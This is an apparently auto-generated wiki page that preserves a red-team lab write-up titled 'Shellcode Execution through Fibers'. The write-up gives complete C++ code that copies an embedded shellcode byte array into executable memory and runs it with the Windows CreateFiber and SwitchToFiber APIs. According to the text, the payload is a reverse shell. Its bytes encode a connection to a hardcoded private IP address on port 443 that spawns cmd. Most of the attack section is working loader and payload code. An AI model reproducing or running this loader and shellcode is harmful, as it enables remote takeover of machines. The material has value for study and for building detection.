---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Shellcode Execution through Fibers

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-executing-shellcode-with-createfiber` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Shellcode Execution through Fibers](../../topics/offensive-security/shellcode-execution-through-fibers.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-executing-shellcode-with-createfiber |
| name | Shellcode Execution through Fibers |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber.md |

## Preserved Source Material

````yaml
_asset_filenames:
- shellcode-fibers.gif
_body: "# Shellcode Execution through Fibers\n\n## Overview\n\nThe purpose of this lab is to use Windows APIs targetting `fibers`\
  \ to execute shellcode in a local process.\n\n> A _fiber_ is a unit of execution that must be manually scheduled by the\
  \ application. Fibers run in the context of the threads that schedule them.   \n> [https://docs.microsoft.com/en-us/windows/win32/procthread/fibers](https://docs.microsoft.com/en-us/windows/win32/procthread/fibers)\n\
  \n## Technique\n\nThe process of the executing shellcode in a local process through fibers:\n\n1. Convert the main thread\
  \ to a fiber. This is required, because only one fiber can schedule another fiber.\n2. Write shellcode to some memory location\
  \ and make it executable\n3. Create a new fiber that points to the shellcode location - this is the fiber we will be scheduling\
  \ from the fiber we got in step 1 when converting the main thread to a fiber.\n4. Schedule the newly created fiber that\
  \ points to our shellcode\n5. The fiber gets scheduled and shellcode executes\n\n## Code\n\nBelow is the code showing how\
  \ to execute the shellcode using fibers:\n\n```cpp\n#include <Windows.h>\n\nint main()\n{\n\t#convert main thread to fiber\n\
  \tPVOID mainFiber = ConvertThreadToFiber(NULL);\n\n \tunsigned char shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\\
  x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\\
  x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\\
  x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\\
  x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\\
  x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\\
  xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\\
  x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\\
  x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\\
  xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\\
  x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\xac\\x14\\x0a\\x07\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\\
  xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\\
  x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\\
  xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\\
  xd5\\x48\\x81\\xc4\\x40\\x02\\x00\\x00\\x49\\xb8\\x63\\x6d\\x64\\x00\\x00\\x00\\x00\\x00\\x41\\x50\\x41\\x50\\x48\\x89\\\
  xe2\\x57\\x57\\x57\\x4d\\x31\\xc0\\x6a\\x0d\\x59\\x41\\x50\\xe2\\xfc\\x66\\xc7\\x44\\x24\\x54\\x01\\x01\\x48\\x8d\\x44\\\
  x24\\x18\\xc6\\x00\\x68\\x48\\x89\\xe6\\x56\\x50\\x41\\x50\\x41\\x50\\x41\\x50\\x49\\xff\\xc0\\x41\\x50\\x49\\xff\\xc8\\\
  x4d\\x89\\xc1\\x4c\\x89\\xc1\\x41\\xba\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x48\\x31\\xd2\\x48\\xff\\xca\\x8b\\x0e\\x41\\xba\\\
  x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\\
  x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\";\n\n\tPVOID shellcodeLocation\
  \ = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tmemcpy(shellcodeLocation, shellcode, sizeof\
  \ shellcode);\n\n\t#\tcreate a fiber that will execute the shellcode\n\tPVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation,\
  \ NULL);\n\t\n\t# manually schedule the fiber that will execute our shellcode\n\tSwitchToFiber(shellcodeFiber);\n\n\treturn\
  \ 0;\n}\n```\n\nRunning the code executes the shellcode us a reverse shell:\n\n![](../../.gitbook/assets/shellcode-fibers.gif)\n\
  \n## References\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/procthread/fibers\" %}\n\n{% embed url=\"\
  https://nullprogram.com/blog/2019/03/28/\" %}\n\n{% embed url=\"http://dronesec.pw/blog/2019/08/12/code-execution-via-fiber-local-storage/\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber.md
````
